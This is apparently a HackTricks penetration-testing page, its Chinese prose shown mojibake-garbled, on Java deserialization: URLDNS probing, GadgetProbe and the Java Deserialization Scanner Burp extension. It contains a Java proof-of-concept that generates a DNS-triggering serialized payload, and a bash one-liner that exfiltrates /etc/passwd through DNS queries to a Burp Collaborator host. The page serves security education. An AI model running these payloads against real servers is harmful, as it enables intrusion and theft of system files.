# Java DNSååºåˆ—åŒ–ã€GadgetProbeå’ŒJavaååºåˆ—åŒ–æ‰«æå™¨

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ååºåˆ—åŒ–æ—¶çš„DNSè¯·æ±‚

`java.net.URL`ç±»å®ç°äº†`Serializable`æ¥å£ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªç±»å¯ä»¥è¢«åºåˆ—åŒ–ã€‚
```java
public final class URL implements java.io.Serializable {
```
è¿™ä¸ªç±»æœ‰ä¸€ä¸ª**å¥‡æ€ªçš„è¡Œä¸ºã€‚**æ ¹æ®æ–‡æ¡£ï¼šâ€œ**å¦‚æœä¸¤ä¸ªä¸»æœºåéƒ½å¯ä»¥è§£æä¸ºç›¸åŒçš„IPåœ°å€ï¼Œåˆ™è®¤ä¸ºä¸¤ä¸ªä¸»æœºæ˜¯ç­‰æ•ˆçš„**â€ã€‚\
å› æ­¤ï¼Œæ¯å½“ä¸€ä¸ªURLå¯¹è±¡è°ƒç”¨**ä»»ä½•**`equals`å‡½æ•°æˆ–**`hashCode`**æ—¶ï¼Œéƒ½å°†å‘é€ä¸€ä¸ªç”¨äºè·å–IPåœ°å€çš„**DNSè¯·æ±‚**ã€‚

ä»ä¸€ä¸ª**URL**å¯¹è±¡ä¸­**è°ƒç”¨**å‡½æ•°**`hashCode`**ç›¸å½“å®¹æ˜“ï¼Œåªéœ€å°†è¯¥å¯¹è±¡æ’å…¥ä¸€ä¸ªå°†è¢«ååºåˆ—åŒ–çš„`HashMap`ä¸­ã€‚è¿™æ˜¯å› ä¸ºåœ¨`HashMap`çš„**`readObject`**å‡½æ•°çš„æœ«å°¾æ‰§è¡Œäº†ä»¥ä¸‹ä»£ç ï¼š
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
å®ƒå°†å¯¹`HashMap`ä¸­çš„æ¯ä¸ªå€¼æ‰§è¡Œ`putVal`ã€‚ä½†æ›´é‡è¦çš„æ˜¯å¯¹æ¯ä¸ªå€¼è°ƒç”¨`hash`ã€‚è¿™æ˜¯`hash`å‡½æ•°çš„ä»£ç ï¼š
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œåœ¨å¯¹`HashMap`è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå‡½æ•°`hash`å°†ä¼šå¯¹æ¯ä¸ªå¯¹è±¡æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨`hash`æ‰§è¡ŒæœŸé—´å°†æ‰§è¡Œå¯¹è±¡çš„`.hashCode()`ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨ååºåˆ—åŒ–ä¸€ä¸ªåŒ…å«URLå¯¹è±¡çš„`HashMap`ï¼Œé‚£ä¹ˆURLå¯¹è±¡å°†æ‰§è¡Œ`.hashCode()`ã€‚

ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹`URLObject.hashCode()`çš„ä»£ç ï¼š
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œå½“`URLObject`æ‰§è¡Œ`.hashCode()`æ—¶ï¼Œå®ƒè¢«ç§°ä¸º`hashCode(this)`ã€‚æ¥ä¸‹æ¥æ‚¨å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼š
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
æ‚¨å¯ä»¥çœ‹åˆ°å¯¹è¯¥åŸŸæ‰§è¡Œäº†`getHostAddress`ï¼Œ**å‘èµ·äº†DNSæŸ¥è¯¢**ã€‚

å› æ­¤ï¼Œå¯ä»¥æ»¥ç”¨è¿™ä¸ªç±»æ¥**å‘èµ·**ä¸€ä¸ª**DNSæŸ¥è¯¢**ï¼Œä»¥**æ¼”ç¤º****ååºåˆ—åŒ–**æ˜¯å¯èƒ½çš„ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥**å¤–æ³„ä¿¡æ¯**ï¼ˆæ‚¨å¯ä»¥å°†å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºé™„åŠ ä¸ºå­åŸŸï¼‰ã€‚

### URLDNSæœ‰æ•ˆè½½è·ä»£ç ç¤ºä¾‹

æ‚¨å¯ä»¥åœ¨[è¿™é‡Œä»ysoserialæ‰¾åˆ°URDNSæœ‰æ•ˆè½½è·ä»£ç ](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)ã€‚ç„¶è€Œï¼Œä¸ºäº†æ›´å®¹æ˜“ç†è§£å¦‚ä½•ç¼–å†™ä»£ç ï¼Œæˆ‘åˆ›å»ºäº†è‡ªå·±çš„PoCï¼ˆåŸºäºysoserialçš„PoCï¼‰ã€‚
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### æ›´å¤šä¿¡æ¯

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* åœ¨æœ€åˆçš„æƒ³æ³•ä¸­ï¼ŒCommons Collections è´Ÿè½½è¢«æ›´æ”¹ä»¥æ‰§è¡Œ DNS æŸ¥è¯¢ï¼Œè¿™æ¯”æå‡ºçš„æ–¹æ³•ä¸å¤ªå¯é ï¼Œä½†è¿™æ˜¯è¯¥æ–‡ç« ï¼š[https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

æ‚¨å¯ä»¥ä» Burp Suite App Storeï¼ˆExtenderï¼‰ä¸‹è½½ [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)ã€‚

**GadgetProbe** å°†å°è¯•ç¡®å®šæœåŠ¡å™¨çš„ Java ç±»ä¸Šæ˜¯å¦å­˜åœ¨æŸäº› **Java ç±»**ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥çŸ¥é“å®ƒæ˜¯å¦**å®¹æ˜“å—åˆ°**æŸäº›å·²çŸ¥æ¼æ´çš„å½±å“ã€‚

### å·¥ä½œåŸç†

**GadgetProbe** å°†ä½¿ç”¨å‰ä¸€éƒ¨åˆ†çš„ç›¸åŒ **DNS è´Ÿè½½**ï¼Œä½†åœ¨è¿è¡Œ DNS æŸ¥è¯¢ä¹‹å‰ï¼Œå®ƒå°†**å°è¯•å¯¹ä»»æ„ç±»è¿›è¡Œååºåˆ—åŒ–**ã€‚å¦‚æœ**ä»»æ„ç±»å­˜åœ¨**ï¼Œåˆ™å°†å‘é€**DNS æŸ¥è¯¢**ï¼ŒGadgProbe å°†è®°å½•æ­¤ç±»å­˜åœ¨ã€‚å¦‚æœ**DNS**è¯·æ±‚**ä»æœªå‘é€**ï¼Œè¿™æ„å‘³ç€**ä»»æ„ç±»æœªæˆåŠŸååºåˆ—åŒ–**ï¼Œå› æ­¤è¦ä¹ˆä¸å­˜åœ¨ï¼Œè¦ä¹ˆ**ä¸å¯åºåˆ—åŒ–/å¯åˆ©ç”¨**ã€‚

åœ¨ GitHub ä¸Šï¼Œ[**GadgetProbe æœ‰ä¸€äº›å•è¯åˆ—è¡¨**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) åŒ…å«è¦è¿›è¡Œæµ‹è¯•çš„ Java ç±»ã€‚

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### æ›´å¤šä¿¡æ¯

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java ååºåˆ—åŒ–æ‰«æå™¨

æ­¤æ‰«æå™¨å¯ä» Burp App Storeï¼ˆExtenderï¼‰ä¸‹è½½ã€‚

è¯¥**æ‰©å±•**å…·æœ‰**è¢«åŠ¨**å’Œä¸»åŠ¨**åŠŸèƒ½**ã€‚

### è¢«åŠ¨

é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼š**è¢«åŠ¨æ£€æŸ¥**æ‰€æœ‰å‘é€çš„è¯·æ±‚å’Œå“åº”ï¼Œ**æŸ¥æ‰¾**æ˜¯å¦å­˜åœ¨**Java åºåˆ—åŒ–é­”æœ¯å­—èŠ‚**ï¼Œå¦‚æœæ‰¾åˆ°ä»»ä½•ä¸€ä¸ªï¼Œå°†æ˜¾ç¤ºæ¼æ´è­¦å‘Šï¼š

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (290).png>)

### ä¸»åŠ¨

**æ‰‹åŠ¨æµ‹è¯•**

æ‚¨å¯ä»¥é€‰æ‹©ä¸€ä¸ªè¯·æ±‚ï¼Œå³é”®å•å‡»å¹¶é€‰æ‹© `Send request to DS - Manual Testing`ã€‚

ç„¶åï¼Œåœ¨ _Deserialization Scanner Tab_ --> _Manual testing tab_ ä¸­ï¼Œæ‚¨å¯ä»¥é€‰æ‹©**æ’å…¥ç‚¹**ã€‚ç„¶å**å¯åŠ¨æµ‹è¯•**ï¼ˆæ ¹æ®ä½¿ç”¨çš„ç¼–ç é€‰æ‹©é€‚å½“çš„æ”»å‡»ï¼‰ã€‚

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

å³ä½¿è¿™è¢«ç§°ä¸ºâ€œæ‰‹åŠ¨æµ‹è¯•â€ï¼Œå®ƒå®é™…ä¸Šæ˜¯ç›¸å½“**è‡ªåŠ¨åŒ–**çš„ã€‚å®ƒå°†è‡ªåŠ¨æ£€æŸ¥**ååºåˆ—åŒ–**æ˜¯å¦**å®¹æ˜“å—åˆ°**ä»»ä½• ysoserial è´Ÿè½½çš„å½±å“ï¼Œæ£€æŸ¥ Web æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„åº“ï¼Œå¹¶çªå‡ºæ˜¾ç¤ºæ˜“å—å½±å“çš„åº“ã€‚ä¸ºäº†**æ£€æŸ¥æ˜“å—å½±å“çš„åº“**ï¼Œæ‚¨å¯ä»¥é€‰æ‹©å¯åŠ¨**Javas Sleeps**ï¼Œé€šè¿‡**CPU**æ¶ˆè€—è¿›è¡Œ**sleeps**ï¼Œæˆ–ä½¿ç”¨**DNS**ï¼Œæ­£å¦‚å…ˆå‰æåˆ°çš„é‚£æ ·ã€‚

**åˆ©ç”¨**

ä¸€æ—¦æ‚¨ç¡®å®šäº†ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº“ï¼Œæ‚¨å¯ä»¥å°†è¯·æ±‚å‘é€åˆ° _Exploiting Tab_ã€‚

åœ¨æ­¤é€‰é¡¹å¡ä¸­ï¼Œæ‚¨å¿…é¡»å†æ¬¡**é€‰æ‹©****æ³¨å…¥ç‚¹**ï¼Œå¹¶**ç¼–å†™**è¦ä¸ºå…¶åˆ›å»ºæœ‰æ•ˆè´Ÿè½½çš„**æ˜“å—æ”»å‡»çš„åº“**å’Œ**å‘½ä»¤**ã€‚ç„¶åï¼Œåªéœ€æŒ‰ä¸‹é€‚å½“çš„**æ”»å‡»**æŒ‰é’®ã€‚

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/4 (1).png>)

### Java ååºåˆ—åŒ– DNS Exfil ä¿¡æ¯

ä½¿æ‚¨çš„æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œç±»ä¼¼ä»¥ä¸‹å†…å®¹çš„æ“ä½œï¼š
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### æ›´å¤šä¿¡æ¯

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
